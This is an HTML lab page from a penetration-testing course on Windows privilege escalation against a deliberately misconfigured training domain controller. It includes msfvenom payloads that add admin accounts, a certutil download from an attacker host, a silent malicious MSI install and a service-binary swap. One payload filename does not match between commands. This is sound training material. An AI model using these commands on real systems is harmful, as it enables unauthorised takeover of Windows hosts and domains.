@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab B14-B: Windows Privilege Escalation</title>
+<style>
+  :root { --orange: #E84E0F; --black: #1A1A1A; --dark: #2a2a2a; --light: #f5f5f5; --border: #ddd; --green: #2d6a2d; --green-bg: #eafaea; --amber: #7a4f00; --amber-bg: #fff8e1; --blue: #003580; --blue-bg: #eef4ff; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Segoe UI', Arial, sans-serif; background: #fff; color: var(--black); font-size: 15px; line-height: 1.6; }
+  .header { background: var(--black); color: #fff; padding: 24px 40px; display: flex; align-items: center; justify-content: space-between; }
+  .course-title { font-size: 13px; color: #aaa; margin-top: 2px; }
+  .lab-badge { background: var(--orange); color: #fff; font-size: 12px; font-weight: 700; padding: 4px 12px; border-radius: 3px; letter-spacing: 1px; }
+  .hero { background: var(--dark); color: #fff; padding: 32px 40px; border-bottom: 4px solid var(--orange); }
+  .hero-meta { display: flex; gap: 24px; margin-bottom: 12px; flex-wrap: wrap; }
+  .hero-meta span { font-size: 12px; color: #aaa; }
+  .hero-meta strong { color: #fff; }
+  .hero h1 { font-size: 26px; font-weight: 800; margin-bottom: 6px; }
+  .hero p { color: #ccc; font-size: 14px; max-width: 700px; }
+  .container { max-width: 900px; margin: 0 auto; padding: 32px 24px; }
+  .section { margin-bottom: 32px; }
+  .section-title { font-size: 17px; font-weight: 700; color: var(--orange); border-bottom: 2px solid var(--orange); padding-bottom: 6px; margin-bottom: 16px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .objective-list { list-style: none; }
+  .objective-list li { padding: 8px 0 8px 28px; position: relative; border-bottom: 1px solid var(--border); font-size: 14px; }
+  .objective-list li:before { content: "▶"; color: var(--orange); position: absolute; left: 0; font-size: 11px; top: 10px; }
+  .objective-list li:last-child { border-bottom: none; }
+  .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin-bottom: 16px; }
+  .info-card { background: var(--light); border-left: 4px solid var(--orange); padding: 12px 16px; }
+  .info-card .label { font-size: 11px; text-transform: uppercase; color: #888; margin-bottom: 4px; letter-spacing: 0.5px; }
+  .info-card .value { font-weight: 700; font-size: 15px; color: var(--black); font-family: monospace; }
+  .step { background: #fff; border: 1px solid var(--border); border-radius: 4px; margin-bottom: 20px; overflow: hidden; }
+  .step-header { background: var(--black); color: #fff; padding: 10px 16px; display: flex; align-items: center; gap: 12px; }
+  .step-num { background: var(--orange); color: #fff; font-weight: 900; font-size: 13px; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .step-title { font-weight: 700; font-size: 15px; }
+  .step-body { padding: 16px 20px; }
+  .step-body p { margin-bottom: 10px; font-size: 14px; }
+  pre { background: #1e1e1e; color: #d4d4d4; padding: 14px 16px; border-radius: 4px; font-size: 13px; overflow-x: auto; margin: 10px 0; font-family: 'Consolas', 'Courier New', monospace; line-height: 1.5; }
+  .comment { color: #6a9955; }
+  .cmd { color: #9cdcfe; }
+  .flag { color: #ce9178; }
+  .output { color: #b5cea8; }
+  .answer-box { border: 2px dashed var(--border); border-radius: 4px; padding: 12px 16px; margin: 10px 0; min-height: 60px; background: #fafafa; }
+  .answer-box .label { font-size: 11px; text-transform: uppercase; color: #888; margin-bottom: 6px; letter-spacing: 0.5px; }
+  .answer-line { border: none; border-bottom: 1px solid #ccc; width: 100%; margin-bottom: 8px; padding: 4px 2px; font-size: 14px; background: transparent; display: block; }
+  .callout { border-radius: 4px; padding: 12px 16px; margin: 12px 0; font-size: 13px; display: flex; gap: 10px; }
+  .callout-icon { font-size: 16px; flex-shrink: 0; }
+  .callout.info { background: var(--blue-bg); border-left: 4px solid var(--blue); color: var(--blue); }
+  .callout.warn { background: var(--amber-bg); border-left: 4px solid #c8a000; color: var(--amber); }
+  .callout.tip { background: var(--green-bg); border-left: 4px solid var(--green); color: var(--green); }
+  .callout.exam { background: #fdf0ff; border-left: 4px solid #7b2d8b; color: #5a1d6e; }
+  table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 10px 0; }
+  th { background: var(--black); color: #fff; padding: 8px 12px; text-align: left; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+  td { padding: 8px 12px; border-bottom: 1px solid var(--border); vertical-align: top; }
+  tr:nth-child(even) td { background: var(--light); }
+  .scenario-box { background: var(--blue-bg); border: 1px solid #b3d0ff; border-radius: 4px; padding: 16px 20px; margin-bottom: 20px; }
+  .scenario-box h3 { color: var(--blue); font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; }
+  .scenario-box p { font-size: 14px; color: var(--dark); }
+  .question { background: var(--light); border: 1px solid var(--border); border-radius: 4px; padding: 14px 16px; margin-bottom: 12px; }
+  .question .q-num { font-weight: 700; color: var(--orange); font-size: 13px; margin-bottom: 6px; }
+  .question p { font-size: 14px; margin-bottom: 8px; }
+  .phase-banner { background: var(--orange); color: #fff; padding: 8px 16px; font-weight: 700; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 16px; border-radius: 3px; }
+  .footer { background: var(--black); color: #888; text-align: center; padding: 16px; font-size: 12px; margin-top: 40px; }
+  .footer span { color: var(--orange); }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div style="display:flex;align-items:center;gap:16px;">
+    <div>
+      <div style="font-weight:700;font-size:15px;color:#fff;">My Cyber Academy</div>
+      <div class="course-title">CREST CPSA - Module B: Core Technical Skills</div>
+    </div>
+  </div>
+  <div class="lab-badge">LAB B14-B</div>
+</div>
+
+<div class="hero">
+  <div class="hero-meta">
+    <span><strong>Syllabus Ref:</strong> B14</span>
+    <span><strong>Duration:</strong> 75 minutes</span>
+    <span><strong>Difficulty:</strong> Intermediate-Advanced</span>
+    <span><strong>Target:</strong> SYNTEX-DC01</span>
+  </div>
+  <h1>Windows Privilege Escalation - Services and Registry</h1>
+  <p>Identify and exploit Windows privilege escalation vectors on SYNTEX-DC01: unquoted service paths, weak service ACLs, and the AlwaysInstallElevated registry policy. Each technique targets a different class of Windows misconfiguration.</p>
+</div>
+
+<div class="container">
+
+  <div class="scenario-box">
+    <h3>Scenario</h3>
+    <p>You have a low-privilege foothold on SYNTEX-DC01 as a domain user. Before escalating privileges, you perform a systematic check of Windows misconfigurations. SYNTEX-DC01 has been intentionally misconfigured with three privilege escalation vectors. Your objective is to identify and exploit each one, documenting proof of SYSTEM access. In a real engagement, SYSTEM on a domain controller is full domain compromise.</p>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Learning Objectives</div>
+    <ul class="objective-list">
+      <li>Identify unquoted service paths and understand why they are exploitable</li>
+      <li>Check service binary ACLs for weak permissions</li>
+      <li>Identify the AlwaysInstallElevated policy via registry and exploit it</li>
+      <li>Enumerate scheduled tasks for writable script paths</li>
+      <li>Document Windows privesc findings for a penetration test report</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Lab Environment</div>
+    <div class="info-grid">
+      <div class="info-card"><div class="label">Target</div><div class="value">SYNTEX-DC01</div></div>
+      <div class="info-card"><div class="label">DC01 IP</div><div class="value">&lt;DC01-IP&gt;</div></div>
+      <div class="info-card"><div class="label">Domain</div><div class="value">syntex.local</div></div>
+      <div class="info-card"><div class="label">Tools</div><div class="value">PowerShell, sc, reg, msiexec</div></div>
+    </div>
+    <div class="callout warn">
+      <span class="callout-icon">⚠</span>
+      <div>Replace all IP placeholders with the values shown in your CourseStack Lab Panel. This lab assumes you have a shell on DC01 as a low-privilege user. Use the SMB shell techniques from prior labs if needed.</div>
+    </div>
+  </div>
+
+  <!-- Phase 1: Reconnaissance -->
+  <div class="section">
+    <div class="phase-banner">Phase 1 - Windows Privesc Enumeration</div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">1</div>
+        <div class="step-title">Unquoted Service Paths</div>
+      </div>
+      <div class="step-body">
+        <p>When a Windows service binary path contains spaces and is not enclosed in quotes, Windows tries to resolve the path ambiguously. An attacker can place a binary in one of the attempted locations to intercept service execution as SYSTEM.</p>
+        <pre><span class="comment"># Find services with unquoted paths (Command Prompt)</span>
+<span class="cmd">wmic service</span> get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
+
+<span class="comment"># PowerShell alternative</span>
+<span class="cmd">Get-WmiObject -Class Win32_Service</span> | Where-Object {
+    $_.PathName -notlike '"*"' -and
+    $_.PathName -match ' ' -and
+    $_.PathName -notmatch '^C:\\Windows'
+} | Select-Object Name,PathName,StartMode
+
+<span class="comment"># Show all services and their paths</span>
+<span class="cmd">sc</span> qc SyntexUpdater</pre>
+        <p>Example of a vulnerable path:</p>
+        <pre><span class="output">BINARY_PATH_NAME: C:\Program Files\Syntex Solutions\Update Service\SyntexUpdater.exe</span></pre>
+        <p>Windows attempts these paths in order:</p>
+        <pre><span class="output">C:\Program.exe
+C:\Program Files\Syntex.exe
+C:\Program Files\Syntex Solutions\Update.exe
+C:\Program Files\Syntex Solutions\Update Service\SyntexUpdater.exe</span></pre>
+        <div class="callout exam">
+          <span class="callout-icon">★</span>
+          <div><strong>CREST Exam Point:</strong> For unquoted service path findings, document the exact service name, the unquoted path, the specific locations Windows would attempt, and whether you have write access to any of those parent directories. Use <code>icacls</code> to check directory permissions. The finding title is "Unquoted Service Path Allows Privilege Escalation".</div>
+        </div>
+        <div class="answer-box">
+          <div class="label">Unquoted service paths found</div>
+          <input class="answer-line" type="text" placeholder="Service name with unquoted path" />
+          <input class="answer-line" type="text" placeholder="Full unquoted path" />
+          <input class="answer-line" type="text" placeholder="Which intermediate paths would Windows try?" />
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">2</div>
+        <div class="step-title">Service Binary ACL Check</div>
+      </div>
+      <div class="step-body">
+        <p>If a low-privilege user has write access to a service binary, they can replace it with a malicious binary that runs as SYSTEM when the service starts.</p>
+        <pre><span class="comment"># Check ACLs on a service binary</span>
+<span class="cmd">icacls</span> "C:\Program Files\Syntex Solutions\Update Service\SyntexUpdater.exe"
+
+<span class="comment"># Check ACLs on the service directory</span>
+<span class="cmd">icacls</span> "C:\Program Files\Syntex Solutions\Update Service\"
+
+<span class="comment"># PowerShell - check all service binaries</span>
+<span class="cmd">Get-WmiObject Win32_Service</span> | ForEach-Object {
+    $path = $_.PathName -replace '"', '' -replace ' .*', ''
+    if (Test-Path $path) {
+        $acl = Get-Acl $path
+        $acl.Access | Where-Object {
+            $_.FileSystemRights -match 'Write|FullControl' -and
+            $_.IdentityReference -notmatch 'SYSTEM|Administrators|TrustedInstaller'
+        } | Select-Object @{N='Service';E={$_.Name}},IdentityReference,FileSystemRights
+    }
+}</pre>
+        <div class="callout info">
+          <span class="callout-icon">ℹ</span>
+          <div><strong>Reading icacls output:</strong> Look for <code>(F)</code> (Full Control), <code>(M)</code> (Modify), or <code>(W)</code> (Write) for groups like <code>BUILTIN\Users</code>, <code>Everyone</code>, or <code>NT AUTHORITY\Authenticated Users</code>. Any of these on a service binary is a critical finding.</div>
+        </div>
+        <div class="answer-box">
+          <div class="label">Weak ACL findings</div>
+          <input class="answer-line" type="text" placeholder="Service binary with weak ACL" />
+          <input class="answer-line" type="text" placeholder="Who has write access? (group/user and permission)" />
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">3</div>
+        <div class="step-title">AlwaysInstallElevated Registry Check</div>
+      </div>
+      <div class="step-body">
+        <p>When both HKLM and HKCU AlwaysInstallElevated registry keys are set to 1, any user can install MSI packages with SYSTEM privileges. This is a well-known but frequently misconfigured policy.</p>
+        <pre><span class="comment"># Check both registry keys (both must be 1 for exploitation)</span>
+<span class="cmd">reg query</span> HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+<span class="cmd">reg query</span> HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+<span class="comment"># If both return 0x1, the setting is enabled</span>
+<span class="output">HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1</span></pre>
+        <div class="answer-box">
+          <div class="label">AlwaysInstallElevated check</div>
+          <input class="answer-line" type="text" placeholder="HKCU AlwaysInstallElevated value" />
+          <input class="answer-line" type="text" placeholder="HKLM AlwaysInstallElevated value" />
+          <input class="answer-line" type="text" placeholder="Is the policy exploitable? (both must be 0x1)" />
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">4</div>
+        <div class="step-title">Scheduled Task Script Permissions</div>
+      </div>
+      <div class="step-body">
+        <p>Scheduled tasks running as SYSTEM that reference writable scripts are equivalent to the Linux cron attack from B13-A.</p>
+        <pre><span class="comment"># List all scheduled tasks</span>
+<span class="cmd">schtasks</span> /query /fo LIST /v
+
+<span class="comment"># PowerShell - tasks running as SYSTEM</span>
+<span class="cmd">Get-ScheduledTask</span> | Where-Object {
+    $_.Principal.UserId -match 'SYSTEM'
+} | Select-Object TaskName,TaskPath
+
+<span class="comment"># Check ACLs on a specific task's script</span>
+<span class="cmd">icacls</span> "C:\Syntex\Scripts\maintenance.ps1"</pre>
+        <div class="answer-box">
+          <div class="label">Scheduled task findings</div>
+          <input class="answer-line" type="text" placeholder="Any SYSTEM tasks running scripts in writable locations?" />
+          <input class="answer-line" type="text" placeholder="Script path and permissions" />
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Phase 2: Exploitation -->
+  <div class="section">
+    <div class="phase-banner">Phase 2 - Exploitation</div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">5</div>
+        <div class="step-title">AlwaysInstallElevated - Craft and Execute Malicious MSI</div>
+      </div>
+      <div class="step-body">
+        <p>Use msfvenom to generate a malicious MSI that adds a local admin user. When installed via msiexec by a low-privilege user, it runs with SYSTEM privileges.</p>
+        <pre><span class="comment"># On Kali - generate the malicious MSI</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p windows/adduser</span> USER=hacked PASS=Hacked123! <span class="flag">-f msi -o</span> /tmp/evil.msi
+
+<span class="comment"># Transfer to the target (via SMB share, HTTP server, etc.)</span>
+<span class="comment"># Example: host on Kali with Python</span>
+<span class="cmd">python3 -m http.server</span> 8080
+
+<span class="comment"># On the target - download and run</span>
+<span class="cmd">certutil</span> <span class="flag">-urlcache -f</span> http://&lt;KALI-IP&gt;:8080/evil.msi C:\Temp\evil.msi
+
+<span class="comment"># Install silently - will run as SYSTEM due to AlwaysInstallElevated</span>
+<span class="cmd">msiexec</span> <span class="flag">/quiet /qn /i</span> C:\Temp\evil.msi
+
+<span class="comment"># Verify the new admin account was created</span>
+<span class="cmd">net user</span> hacked
+<span class="cmd">net localgroup</span> administrators</pre>
+        <div class="callout exam">
+          <span class="callout-icon">★</span>
+          <div><strong>CREST Exam Point:</strong> The AlwaysInstallElevated finding requires both keys to be set. Document both registry values as evidence. The exploit proof is the creation of the local admin account and a whoami /all output from that account showing the elevated privileges. Finding title: "AlwaysInstallElevated Policy Enables Privilege Escalation to SYSTEM".</div>
+        </div>
+        <div class="answer-box">
+          <div class="label">AlwaysInstallElevated exploitation result</div>
+          <input class="answer-line" type="text" placeholder="New account created? (net user hacked)" />
+          <input class="answer-line" type="text" placeholder="Is the account in the Administrators group?" />
+          <input class="answer-line" type="text" placeholder="Evidence of SYSTEM-level installation" />
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">6</div>
+        <div class="step-title">Weak Service Binary ACL - Replace and Execute</div>
+      </div>
+      <div class="step-body">
+        <p>If you have write access to a service binary, replace it with a command that adds a local admin, then restart the service to trigger execution as SYSTEM.</p>
+        <pre><span class="comment"># On Kali - generate a binary payload</span>
+<span class="cmd">msfvenom</span> <span class="flag">-p windows/adduser</span> USER=svcadmin PASS=SvcAdmin123! <span class="flag">-f exe -o</span> /tmp/SyntexUpdater.exe
+
+<span class="comment"># Transfer to the target</span>
+<span class="comment"># Back up the original binary first</span>
+<span class="cmd">copy</span> "C:\Program Files\Syntex Solutions\Update Service\SyntexUpdater.exe" C:\Temp\SyntexUpdater.exe.bak
+
+<span class="comment"># Replace the binary</span>
+<span class="cmd">copy</span> /y C:\Temp\evil_updater.exe "C:\Program Files\Syntex Solutions\Update Service\SyntexUpdater.exe"
+
+<span class="comment"># Restart the service to trigger execution</span>
+<span class="cmd">sc</span> stop SyntexUpdater
+<span class="cmd">sc</span> start SyntexUpdater
+
+<span class="comment"># Check if the new admin was created</span>
+<span class="cmd">net localgroup</span> administrators</pre>
+        <div class="callout warn">
+          <span class="callout-icon">⚠</span>
+          <div><strong>Always restore originals:</strong> In a real engagement, after demonstrating the vulnerability, restore the original binary immediately. Document the finding, take screenshots, and restore. Leaving systems in an exploited state violates rules of engagement.</div>
+        </div>
+        <div class="answer-box">
+          <div class="label">Weak ACL exploitation result</div>
+          <input class="answer-line" type="text" placeholder="Was the binary replaced successfully?" />
+          <input class="answer-line" type="text" placeholder="Did the service restart trigger the payload?" />
+          <input class="answer-line" type="text" placeholder="New admin account created?" />
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Comparison Table -->
+  <div class="section">
+    <div class="section-title">Windows vs Linux Privilege Escalation - Comparison</div>
+    <table>
+      <tr><th>Vector</th><th>Linux Equivalent</th><th>Windows Technique</th><th>Severity</th></tr>
+      <tr><td>SUID binary</td><td>/usr/local/bin/rootshell</td><td>Weak service binary ACL</td><td>Critical</td></tr>
+      <tr><td>World-writable cron</td><td>/etc/crontab script</td><td>Writable scheduled task script</td><td>Critical</td></tr>
+      <tr><td>sudo NOPASSWD</td><td>/etc/sudoers</td><td>AlwaysInstallElevated policy</td><td>High</td></tr>
+      <tr><td>Path hijack</td><td>$PATH manipulation</td><td>Unquoted service path</td><td>High</td></tr>
+    </table>
+  </div>
+
+  <!-- Knowledge Check -->
+  <div class="section">
+    <div class="section-title">Knowledge Check</div>
+
+    <div class="question">
+      <div class="q-num">Q1</div>
+      <p>A service has the binary path: <code>C:\Program Files\Syntex App\Payments Service\payments.exe</code>. The path is unquoted and you have write access to <code>C:\Program Files\Syntex App\</code>. What would you create and where to exploit this?</p>
+      <div class="answer-box">
+        <input class="answer-line" type="text" placeholder="File to create and its exact path" />
+        <input class="answer-line" type="text" placeholder="Why Windows would execute it" />
+      </div>
+    </div>
+
+    <div class="question">
+      <div class="q-num">Q2</div>
+      <p>You check AlwaysInstallElevated and find HKCU is 0x1 but HKLM is 0x0. Is this exploitable? Explain why.</p>
+      <div class="answer-box">
+        <input class="answer-line" type="text" placeholder="Is it exploitable? Why or why not?" />
+      </div>
+    </div>
+
+    <div class="question">
+      <div class="q-num">Q3</div>
+      <p>icacls shows <code>BUILTIN\Users:(F)</code> on a service binary running as SYSTEM. What does (F) mean and what is the attack?</p>
+      <div class="answer-box">
+        <input class="answer-line" type="text" placeholder="What (F) means" />
+        <input class="answer-line" type="text" placeholder="The attack" />
+      </div>
+    </div>
+
+    <div class="question">
+      <div class="q-num">Q4</div>
+      <p>You achieve SYSTEM on SYNTEX-DC01. What specific evidence would you collect to prove domain-level impact in your report?</p>
+      <div class="answer-box">
+        <input class="answer-line" type="text" placeholder="Evidence 1 (what and why)" />
+        <input class="answer-line" type="text" placeholder="Evidence 2 (what and why)" />
+        <input class="answer-line" type="text" placeholder="Evidence 3 (what and why)" />
+      </div>
+    </div>
+  </div>
+
+  <div class="callout exam">
+    <span class="callout-icon">★</span>
+    <div><strong>Lab Complete - Key Takeaways:</strong> Windows privilege escalation relies on service misconfigurations, weak ACLs, and policy errors. CREST CPSA candidates should be fluent in checking unquoted service paths (wmic service get), service binary permissions (icacls), and the AlwaysInstallElevated registry keys. SYSTEM on a domain controller means domain compromise - in the report, this is the highest impact finding on the engagement.</div>
+  </div>
+
+</div>
+
+<div class="footer">
+  <span>My Cyber Academy</span> - CREST CPSA - Module B Lab B14-B - Windows Privilege Escalation v1
+</div>
+
+</body>
+</html>
